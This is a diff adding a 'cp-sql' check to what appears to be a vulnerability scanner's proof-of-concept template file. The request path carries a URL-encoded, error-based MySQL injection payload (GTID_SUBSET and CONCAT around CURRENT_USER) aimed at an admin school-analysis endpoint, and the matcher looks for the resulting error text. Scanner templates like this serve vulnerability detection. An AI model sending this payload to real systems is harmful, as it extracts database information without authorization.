@@ -1060,3 +1060,15 @@ pocs:
               - 'createJNDIRealm'
               - 'type=MBeanFactory'
             condition: "and"
+  - id: "cp-sql"
+    name: "cp-sql"
+    requests:
+      - method: "GET"
+        path: '/admin/school/analysis/new/user?beginDate=20250512&endDate=%27%20AND%20GTID_SUBSET%28CONCAT%280x7171716b71%2C%28MID%28%28IFNULL%28CAST%28CURRENT_USER%28%29%20AS%20NCHAR%29%2C0x20%29%29%2C1%2C190%29%29%2C0x716a627671%29%2C9489%29--%20UDuS'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'ER_MALFORMED_GTID_SET_SPECIFICATION'
+              - '@'
+            condition: "and"
